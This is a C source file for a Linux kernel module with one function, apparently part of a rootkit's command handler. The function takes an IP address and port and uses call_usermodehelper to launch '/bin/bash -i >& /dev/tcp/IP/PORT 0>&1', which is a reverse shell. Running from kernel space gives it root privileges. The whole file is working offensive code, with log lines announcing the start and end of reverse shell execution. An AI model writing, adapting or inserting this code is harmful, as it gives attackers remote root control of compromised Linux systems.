#include <linux/kmod.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>  // For kmalloc and kfree

void execute_reversetcp_command(const char **args, int arg_count) {
    // Ensure that we have at least 2 arguments (IP and port)
    if (arg_count < 2) {
        printk(KERN_ERR "reverse_tcp command requires IP and port arguments\n");
        return;
    }

    const char *ip = args[0];
    const char *port = args[1];

    char *envp[] = { 
        "HOME=/", 
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", 
        NULL 
    };

    // Allocate memory for the command string
    char *command = kmalloc(128, GFP_KERNEL);  // 128 bytes should be enough for the command

    // Check if memory allocation was successful
    if (!command) {
        printk(KERN_ERR "Failed to allocate memory for command string\n");
        return;
    }

    // Construct the reverse shell command dynamically using the provided IP and port
    snprintf(command, 128, "/bin/bash -i >& /dev/tcp/%s/%s 0>&1", ip, port);

    // Prepare the arguments for usermode helper
    char *argv[] = { 
        "/bin/bash", 
        "-c", 
        command, 
        NULL 
    };

    printk(KERN_INFO "[+] Reverse Shell Execution Begin\n");
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    printk(KERN_INFO "[+] Reverse Shell Execution End\n");

    // Free the allocated memory after usage
    kfree(command);
}
